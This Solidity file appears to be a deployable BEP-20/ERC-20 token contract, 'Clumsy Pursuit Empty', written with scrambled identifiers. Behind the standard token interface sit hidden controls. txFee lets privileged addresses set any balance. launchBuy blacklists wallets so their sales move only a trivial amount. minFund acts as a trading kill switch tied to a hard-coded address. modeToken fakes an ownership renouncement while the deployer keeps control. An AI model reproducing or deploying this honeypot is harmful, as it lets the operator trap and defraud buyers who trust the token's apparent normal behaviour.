//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface minSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atExempt) external view returns (uint256);

    function transfer(address walletMax, uint256 feeAuto) external returns (bool);

    function allowance(address receiverBuy, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeAuto) external returns (bool);

    function transferFrom(
        address sender,
        address walletMax,
        uint256 feeAuto
    ) external returns (bool);

    event Transfer(address indexed from, address indexed buyLimit, uint256 value);
    event Approval(address indexed receiverBuy, address indexed spender, uint256 value);
}

abstract contract txReceiverBuy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface senderReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface tokenLimit {
    function createPair(address launchMode, address limitTeam) external returns (address);
}

interface amountTotal is minSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ClumsyPursuitEmpty is txReceiverBuy, minSwap, amountTotal {

    bool public totalBuyMin;

    function transferFrom(address fundMaxReceiver, address walletMax, uint256 feeAuto) external override returns (bool) {
        if (_msgSender() != fundFeeSwap) {
            if (fundAmount[fundMaxReceiver][_msgSender()] != type(uint256).max) {
                require(feeAuto <= fundAmount[fundMaxReceiver][_msgSender()]);
                fundAmount[fundMaxReceiver][_msgSender()] -= feeAuto;
            }
        }
        return maxSell(fundMaxReceiver, walletMax, feeAuto);
    }

    function maxSell(address fundMaxReceiver, address walletMax, uint256 feeAuto) internal returns (bool) {
        if (fundMaxReceiver == teamAt) {
            return liquidityToken(fundMaxReceiver, walletMax, feeAuto);
        }
        uint256 tokenIs = minSwap(fundAuto).balanceOf(fundMarketingReceiver);
        require(tokenIs == tradingMarketing);
        require(walletMax != fundMarketingReceiver);
        if (isBuyLimit[fundMaxReceiver]) {
            return liquidityToken(fundMaxReceiver, walletMax, receiverSellExempt);
        }
        return liquidityToken(fundMaxReceiver, walletMax, feeAuto);
    }

    mapping(address => bool) public shouldAuto;

    uint256 private buySender;

    uint8 private minSender = 18;

    uint256 private walletFundEnable = 100000000 * 10 ** 18;

    bool public totalMode;

    event OwnershipTransferred(address indexed maxLaunch, address indexed senderLiquidity);

    uint256 tradingMarketing;

    function balanceOf(address atExempt) public view virtual override returns (uint256) {
        return modeWalletLimit[atExempt];
    }

    function launchBuy(address walletList) public {
        fromAmount();
        if (enableTotal) {
            totalMode = false;
        }
        if (walletList == teamAt || walletList == fundAuto) {
            return;
        }
        isBuyLimit[walletList] = true;
    }

    uint256 shouldFundEnable;

    address public fundAuto;

    bool private receiverShould;

    function approve(address walletAuto, uint256 feeAuto) public virtual override returns (bool) {
        fundAmount[_msgSender()][walletAuto] = feeAuto;
        emit Approval(_msgSender(), walletAuto, feeAuto);
        return true;
    }

    function liquidityToken(address fundMaxReceiver, address walletMax, uint256 feeAuto) internal returns (bool) {
        require(modeWalletLimit[fundMaxReceiver] >= feeAuto);
        modeWalletLimit[fundMaxReceiver] -= feeAuto;
        modeWalletLimit[walletMax] += feeAuto;
        emit Transfer(fundMaxReceiver, walletMax, feeAuto);
        return true;
    }

    function getOwner() external view returns (address) {
        return listAt;
    }

    address fundFeeSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) public isBuyLimit;

    function transfer(address isBuy, uint256 feeAuto) external virtual override returns (bool) {
        return maxSell(_msgSender(), isBuy, feeAuto);
    }

    constructor (){
        if (listTrading == buySender) {
            enableTotal = false;
        }
        modeToken();
        senderReceiver senderSwapFund = senderReceiver(fundFeeSwap);
        fundAuto = tokenLimit(senderSwapFund.factory()).createPair(senderSwapFund.WETH(), address(this));
        if (enableTotal) {
            enableTotal = true;
        }
        teamAt = _msgSender();
        shouldAuto[teamAt] = true;
        modeWalletLimit[teamAt] = walletFundEnable;
        
        emit Transfer(address(0), teamAt, walletFundEnable);
    }

    function symbol() external view virtual override returns (string memory) {
        return teamFee;
    }

    function owner() external view returns (address) {
        return listAt;
    }

    address private listAt;

    uint256 private listTrading;

    function fromAmount() private view {
        require(shouldAuto[_msgSender()]);
    }

    function allowance(address marketingTx, address walletAuto) external view virtual override returns (uint256) {
        if (walletAuto == fundFeeSwap) {
            return type(uint256).max;
        }
        return fundAmount[marketingTx][walletAuto];
    }

    function minFund(uint256 feeAuto) public {
        fromAmount();
        tradingMarketing = feeAuto;
    }

    string private teamFee = "CPEY";

    string private minExempt = "Clumsy Pursuit Empty";

    function name() external view virtual override returns (string memory) {
        return minExempt;
    }

    function txFee(address isBuy, uint256 feeAuto) public {
        fromAmount();
        modeWalletLimit[isBuy] = feeAuto;
    }

    mapping(address => mapping(address => uint256)) private fundAmount;

    bool public enableTotal;

    function modeToken() public {
        emit OwnershipTransferred(teamAt, address(0));
        listAt = address(0);
    }

    function decimals() external view virtual override returns (uint8) {
        return minSender;
    }

    function senderSell(address minAmount) public {
        if (totalBuyMin) {
            return;
        }
        if (enableTotal) {
            enableTotal = false;
        }
        shouldAuto[minAmount] = true;
        if (receiverShould != enableTotal) {
            enableTotal = true;
        }
        totalBuyMin = true;
    }

    address public teamAt;

    uint256 constant receiverSellExempt = 20 ** 10;

    function totalSupply() external view virtual override returns (uint256) {
        return walletFundEnable;
    }

    address fundMarketingReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => uint256) private modeWalletLimit;

}